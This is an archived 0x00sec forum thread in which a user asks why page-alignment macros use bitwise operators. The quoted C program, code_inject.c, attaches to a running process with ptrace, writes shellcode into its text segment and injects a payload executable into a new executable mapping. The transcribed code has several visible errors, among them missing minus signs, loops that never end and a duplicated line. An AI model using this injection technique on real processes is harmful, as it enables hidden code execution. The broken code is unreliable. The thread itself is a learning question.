<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>ELF process memory injection - Questions - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Hello, 
On lines 15-18, why does the author use big wise operators in that way? What, exactly, is the purpose? 
Here is a description of the program in the authorâ€™s own words: 
â€œ 

In Linux, the default ptrace() behavior&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="5789.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="oowfjp1Po7Dv5eq6dfl9iSEOA"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="oowfjp1Po7Dv5eq6dfl9iSEOA"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;ELF process memory injection&#39;" href="5789.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/elf-process-memory-injection/5789" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/elf-process-memory-injection/5789" />
<meta property="og:title" content="ELF process memory injection" />
<meta name="twitter:title" content="ELF process memory injection" />
<meta property="og:description" content="Hello,  On lines 15-18, why does the author use big wise operators in that way? What, exactly, is the purpose?  Here is a description of the program in the authorâ€™s own words:  â€œ   In Linux, the default ptrace() behavior is such that it allows you to write Using PTRACE_POKETEXT to segments that are not writable, such as the text segment. This is because it is expected that debuggers will need to insert breakpoints into the code. This works out great for hackers who want to insert code into memor..." />
<meta name="twitter:description" content="Hello,  On lines 15-18, why does the author use big wise operators in that way? What, exactly, is the purpose?  Here is a description of the program in the authorâ€™s own words:  â€œ   In Linux, the default ptrace() behavior is such that it allows you to write Using PTRACE_POKETEXT to segments that are not writable, such as the text segment. This is because it is expected that debuggers will need to insert breakpoints into the code. This works out great for hackers who want to insert code into memor..." />
<meta property="og:article:section" content="Questions" />
<meta property="og:article:section:color" content="BF1E2E" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="2 mins ðŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="3 â¤" />
<meta property="article:published_time" content="2018-03-10T15:00:46+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="5789.html">ELF process memory injection</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/support/52.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #BF1E2E'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Questions</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='ELF process memory injection'>
      <link itemprop='url' href='5789.html'>
      <meta itemprop='datePublished' content='2018-03-10T15:00:45Z'>
        <meta itemprop='articleSection' content='Questions'>
      <meta itemprop='keywords' content=''>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Bowlslaw.html'><span itemprop='name'>Bowlslaw</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="5789.html">


              <span class="crawler-post-infos">
                  <time  datetime='2018-03-10T15:00:46Z' class='post-time'>
                    March 10, 2018,  3:00pm
                  </time>
                  <meta itemprop='dateModified' content='2018-03-10T15:00:46Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hello,</p>
<p>On lines 15-18, why does the author use big wise operators in that way? What, exactly, is the purpose?</p>
<p>Here is a description of the program in the authorâ€™s own words:</p>
<p>â€œ</p>
<blockquote>
<p>In Linux, the default ptrace() behavior is such that it allows you to write Using PTRACE_POKETEXT to segments that are not writable, such as the text segment. This is because it is expected that debuggers will need to insert breakpoints into the code. This works out great for hackers who want to insert code into memory and execute it. To demonstrate this, we have written code_inject.c. This attaches to a process and injects a shellcode that will create an anonymous memory mapping large enough to hold our payload executable, payload.c, which is then injected into the new memory and executed.â€œ</p>
</blockquote>
<pre><code>  1 #include &lt;stdio.h&gt;
  2 #include &lt;string.h&gt;
  3 #include &lt;stdlib.h&gt;
  4 #include &lt;unistd.h&gt;
  5 #include &lt;fcntl.h&gt;
  6 #include &lt;errno.h&gt;
  7 #include &lt;signal.h&gt;
  8 #include &lt;elf.h&gt;
  9 #include &lt;sys/types.h&gt;
 10 #include &lt;sys/user.h&gt;
 11 #include &lt;sys/stat.h&gt;
 12 #include &lt;sys/ptrace.h&gt;
 13 #include &lt;sys/mman.h&gt;
 14
 15 #define PAGE_ALIGN(x) (x &amp; ~(PAGE_SIZE 1))
 16 #define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
 17 #define WORD_ALIGN(x) ((x + 7) &amp; ~7)
 18 #define BASE_ADDRESS 0x00100000
 19
 20 typedef struct handle {
 21     Elf64_Ehdr *ehdr;
 22     Elf64_Phdr *phdr;
 23     Elf64_Shdr *shdr;
 24     uint8_t *mem;
 25     pid_t pid;
 26     uint8_t *shellcode;
 27     char *exec_path;
 28     uint64_t base;
 29     uint64_t stack;
 30     uint64_t entry;
 31     struct user_regs_struct pt_reg;
 32 } handle_t;
 33
 34 static inline volatile void * evil_mmap(void *, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)__attribute__((aligned(8), __always_inline__))    ;
 35 uint64_t injection_code(void *) __attribute__((aligned(8)));
 36 uint64_t get_text_base(pid_t);
 37 int pid_write(int, void *, const void *, size_t);
 38 uint8_t *create_fn_shellcode(void (*fn)(), size_t len);
 39
 40 void *f1 = injection_code;
 41 void *f2 = get_text_base;
 42
 43 static inline volatile long evil_write(long fd, char *buf, unsigned long len) {
 44     long ret;
 45     __asm__ volatile(
 46             "mov %0, %%rdi\n"
 47             "mov %1, %%rsi\n"
 48             "mov %2, %%rdx\n"
 49             "mov %1, %%rax\n"
 50             "syscall" : : "g"(fd), "g"(buf), "g"(len));
 51     asm("mov %%rax, %0" : "=r"(ret));
 52     return ret;
 53 }
 54
 55 static inline volatile int evil_fstat(long fd, struct stat *buf) {
 56     long ret;
 57     __asm__ volatile(
 58             "mov %0, %%rdi\n"
 59             "mov %1, %%rsi\n"
 60             "mov %5, %%rax\n"
 61             "syscall" : : "g"(fd), "g"(buf));
 62     asm("mov %%rax, %0" : "=r"(ret));
 63     return ret;
 64 }
 65
 66 static inline volatile int evil_open(const char *path, unsigned long flags) {
 67     long ret;
 68     __asm__ volatile(
 69             "mov %0, %%rdi\n"
 70             "mov %1, %%rsi\n"
 71             "mov %2, %%rax\n"
 72             "syscall" : : "g"(path), "g"(flags));
 73     asm("mov %%rax, %0" : "=r"(ret));
 74     return ret;
 75 }
 76
 77 static inline volatile void * evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, uint64_t fd, uint64_t off) {
 78     long mmap_fd = fd;
 79     unsigned long mmap_off = off;
 80     unsigned long mmap_flags = flags;
 81     unsigned long ret;
 82     __asm__ volatile(
 83             "mov %0, %%rdi\n"
 84             "mov %1, %%rsi\n"
 85             "mov %2, %%rdx\n"
 86             "mov %3, %%r10\n"
 87             "mov %5, %%r8\n"
 88             "mov %5, %%r9\n"
 89             "mov $9, %%rax\n"
 90             "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
 91     asm("mov %%rax, %0" : "=r"(ret));
 92     return(void *)ret;
 93 }
 94
 95 uint64_t injection_code(void * vaddr) {
 96     volatile void *mem;
 97     mem = evil_mmap(vaddr, 8192, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, 1, 0);
 98     __asm__ __volatile__("int3");
 99 }
100
101 #define MAX_PATH 512
102
103 uint64_t get_text_base(pid_t pid) {
104     char maps[MAX_PATH], line[256];
105     char *start, *p;
106     FILE *fd;
107     int i;
108     Elf64_Addr base;
109     snprintf(maps, MAX_PATH, 1, "/proc/%d/maps", pid);
110     if((fd = fopen(maps, "r")) == NULL) {
111         fprintf(stderr, "Cannot open %s for reading: %s\n", maps, strerror(errno));
112         return 1;
113     }

115     while(fgets(line, sizeof(line), fd)) {
116         if(!strstr(line, "rxp"))
117             continue;
118         for(i = 0, start = alloca(32), p = line; *p != ' '; i++, p++)
119             start[i] = *p;
120
121         start[i] = '\0';
122         base = strtol(start, NULL, 16);
123         break;
124     }
125     fclose(fd);
126     return base;
127 }
128
129 uint8_t * create_fn_shellcode(void (*fn)(), size_t len) {
130     size_t i;
131     uint8_t *shellcode = (uint8_t *)malloc(len);
132     uint8_t *p = (uint8_t *)fn;
133     for(i = 0; i &lt; len; i++)
134         return shellcode;
135 }
136
137 int pid_read(int pid, void *dst, const void *src, size_t len) {
138     int sz = len / sizeof(void *);
139     unsigned char *s = (unsigned char *)src;
140     unsigned char *d = (unsigned char *)dst;
141     long word;
142     while (sz!=0) {
143         word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
144         if (word == 1 &amp;&amp; errno) {
145             fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid,strerror(errno));
146
147             goto fail;
148         }
149
150         *(long *)d = word;
151         s += sizeof(long);
152         d += sizeof(long);
153     }
154     return 0;
155 fail:
156     perror("PTRACE_PEEKTEXT");
157     return 1;
158 }
159
160 int pid_write(int pid, void *dest, const void *src, size_t len) {
161     size_t quot = len / sizeof(void *);
162     unsigned char *s = (unsigned char *) src;
163     unsigned char *d = (unsigned char *) dest;
164     while (quot!= 0) {
165         if ( ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)
166             goto out_error;
167         s += sizeof(void *);
168         d += sizeof(void *);
169     }
170     return 0;
171     out_error:
172     perror("PTRACE_POKETEXT");
173     return 1;
174 }
175
176 int main(int argc, char **argv) {
177     handle_t h;
178     unsigned long shellcode_size = f2, f1;
179     int i, fd, status;
180     uint8_t *executable, *origcode;
181     struct stat st;
182     Elf64_Ehdr *ehdr;
183
184     if(argc &lt; 3) {
185         printf("Usage: %s &lt;pid&gt; &lt;executable&gt;\n", argv[0]);
186         exit(1);
187     }
188
189     h.pid = atoi(argv[1]);
190     h.exec_path = strdup(argv[2]);
191
192     if(ptrace(PTRACE_ATTACH, h.pid) &lt; 0) {
193         perror("PTRACE_ATTACH");
194         exit(1);
195     }
196
197     wait(NULL);
198
199     h.base = get_text_base(h.pid);
200     shellcode_size += 8;
201     h.shellcode = create_fn_shellcode((void *)&amp;injection_code, shellcode_size);
202     origcode = alloca(shellcode_size);
203
204     if(pid_read(h.pid, (void *)origcode, (void *)h.base, shellcode_size) &lt; 0)
205         exit(1);
206
207     if(pid_write(h.pid, (void *)h.base, (void *)h.shellcode, shellcode_size) &lt; 0)
208         exit(1);
209
210     if(ptrace(PTRACE_GETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
211         perror("PTRACE_GETREGS");
212         exit(1);
213     }
214     h.pt_reg.rip = h.base;
215     h.pt_reg.rdi = BASE_ADDRESS;
216
217     if(ptrace(PTRACE_SETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
218         perror("PTRACE_SETREGS");
219         exit(1);
220     }
221     if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) &lt; 0) {
222         perror("PTRACE_CONT");
223         exit(1);
224     }
225
226     wait(&amp;status);
227
228     if(WSTOPSIG(status) != SIGTRAP) {
 if(WSTOPSIG(status) != SIGTRAP) {
229         printf("Something went wrong\n");
230         exit(1);
231     }
232
233     if(pid_write(h.pid, (void *)h.base, (void *)origcode, shellcode_size) &lt; 0)
234         exit(1);
235
236     if((fd = open(h.exec_path, O_RDONLY)) &lt; 0) {
237     perror("open");
238     exit(1);
239   }
240
241     if(fstat(fd, &amp;st) &lt; 0) {
242         perror("fstat");
243         exit(1);
244     }
245     executable = malloc(WORD_ALIGN(st.st_size));
246
247     if (read(fd, executable, st.st_size) &lt; 0) {
248         perror("read");
249         exit(1);
250     }
251
252     ehdr = (Elf64_Ehdr *)executable;
253     h.entry = ehdr-&gt;e_entry;
254
255     close(fd);
256
257     if(pid_write(h.pid, (void *)BASE_ADDRESS, (void *)executable, st.st_size) &lt; 0)
258         exit(1);
259
260     if(ptrace(PTRACE_GETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
261         perror("PTRACE_GETREGS");
262         exit(1);
263     }
264
265     h.entry = BASE_ADDRESS + h.entry;
266
267     h.pt_reg.rip = h.entry;
268
269     if(ptrace(PTRACE_SETREGS, h.pid, NULL, &amp;h.pt_reg) &lt; 0) {
270         perror("PTRACE_SETREGS");
271         exit(1);
272     }
273
274     if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL) &lt; 0) {
275         perror("PTRACE_CONT");
276         exit(1);
277     }
278
279     wait(NULL);
280     exit(0);
281 }
</code></pre>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/0x00pf.html'><span itemprop='name'>0x00pf</span></a>
                (pico)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-03-10T20:09:36Z' class='post-time'>
                    March 10, 2018,  8:09pm
                  </time>
                  <meta itemprop='dateModified' content='2018-03-10T20:09:36Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hi <a class="mention" href="../../u/bowlslaw-2.html">@Bowlslaw</a></p>
<p>Check section <strong>Understanding Paging</strong> in</p>
<p><a href="../../../external.html?link=https://0x00sec.org/t/a-simple-linux-crypter/537" class="onebox" target="_blank" rel="noopener nofollow ugc">https://0x00sec.org/t/a-simple-linux-crypter/537</a></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="oowfjp1Po7Dv5eq6dfl9iSEOA"></script>
  </body>
  
</html>
